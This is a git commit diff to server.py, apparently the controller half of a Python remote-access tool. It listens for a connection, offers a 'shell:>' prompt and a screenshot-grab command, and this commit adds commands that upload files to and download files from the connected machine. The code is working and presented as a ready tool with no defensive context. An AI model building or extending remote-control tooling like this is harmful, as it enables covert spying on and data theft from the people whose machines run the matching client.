b8f2e4531c648823af431b344261e51cc82e2840
Grandhi Naga Srikanth <nagasrikanthgrandhi@gmail.com>
2018-06-11 05:46:42 -0400

    Update server.py

--- server.py
+++ server.py
@@ -1,5 +1,6 @@
 import socket
 import os
+import time
 ip="localhost"#Your address or this computer address
 port=8080 #Port number you want to use
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -14,12 +15,22 @@ def download(filename):
         f=open(filename,"wb")
         while True:
             data=conn.recv(1024)          
-            if  b"DONE" in data:
+            if  b"DONE" == data:
                 break
             else:
                 f.write(data)
+                print(data)
         f.close()
         print("done receving")
+
+def upload(filename):
+    f=open(filename,"rb")
+    data=f.read(1024)
+    while (data):
+        conn.send(data)
+        data=f.read(1024)
+    f.close()
+    conn.send(b"DONE")
 
 while True:
     inp=input("shell:>")
@@ -33,6 +44,14 @@ while True:
     elif inp=="sc":
         conn.send(b"screenshot")
         download("sc.png")
+    elif inp.startswith("upload="):
+        conn.send((inp).encode())        
+        time.sleep(1)
+        upload((inp[7:]))
+    elif inp.startswith("download="):
+        conn.send(inp.encode())
+        time.sleep(1)
+        download(inp[9:])
     elif inp=="":
         pass
     else:
